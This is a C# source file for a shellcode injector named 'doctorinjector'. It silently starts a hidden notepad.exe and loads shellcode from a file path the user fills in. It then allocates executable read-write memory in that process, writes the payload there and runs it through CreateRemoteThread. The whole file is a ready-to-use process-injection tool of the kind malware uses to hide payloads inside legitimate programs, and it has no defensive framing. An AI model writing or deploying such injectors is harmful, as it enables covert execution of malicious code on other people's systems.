using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace doctorinjector
{
    class Program
    {
        // simple injector, all you have to do is pass the path to the shellcode where I marked at line 60.
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
             uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }


        static void Main(string[] args)
        {
#if DEBUG 
            return;
#endif
            var target = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\notepad.exe",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                }
            };
            target.Start();
            var shellcode = File.ReadAllBytes(@"FOLDER_TO_SHELLCODE_HERE");
            var hMemory = VirtualAllocEx(target.Handle, IntPtr.Zero, (uint)shellcode.Length, (uint)
                (MemAllocation.MEM_RESERVE | MemAllocation.MEM_COMMIT),
                (uint)MemProtect.PAGE_EXECUTE_READWRITE);
            var success = WriteProcessMemory(target.Handle, hMemory, shellcode, shellcode.Length, out _);
            if (success)
            {
                uint lpThreadId = 0;
                var hThread = CreateRemoteThread(target.Handle, IntPtr.Zero, 0, hMemory,
                    IntPtr.Zero, 0,ref lpThreadId);

            }
        }
    }
}
